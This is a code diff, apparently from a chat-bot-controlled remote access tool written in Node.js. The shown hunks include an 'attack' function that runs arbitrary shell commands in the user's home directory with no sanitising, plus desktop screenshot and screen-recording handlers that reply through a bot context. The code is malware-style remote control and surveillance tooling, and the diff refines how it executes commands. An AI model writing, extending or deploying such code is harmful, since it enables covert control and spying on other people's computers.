@@ -1,12 +1,9 @@
 const exec = require("child_process").exec;
 const screenshot = require("screenshot-desktop");
-const notifier = require("node-notifier");
 const fs = require("fs");
 const os = require("os");
-const { error } = require("console");
-const { stdout, stderr } = require("process");
-const { resolve } = require("path");
 const path = require("path");
+
 async function openUrl(browserurl) {
   return new Promise((resolve, reject) => {
     exec(`start ${browserurl}`, (err, stdout, stderr) => {
@@ -55,7 +52,8 @@ async function executeCommand(command) {
 
 async function attack(cmd) {
   return new Promise((resolve, reject) => {
-    exec(cmd, (error, stdout, stderr) => {
+    const homePath = path.join(os.homedir());
+    exec(`cd ${homePath} && ${cmd}`, (error, stdout, stderr) => {
       if (error) {
         reject(error);
       } else {
@@ -148,7 +146,7 @@ const recordScreen = async (ctx) => {
       }
     );
   } catch (err) {
-    return err;
+    await ctx.reply("Lỗi không xác định: " + err.message);
   }
 };
 
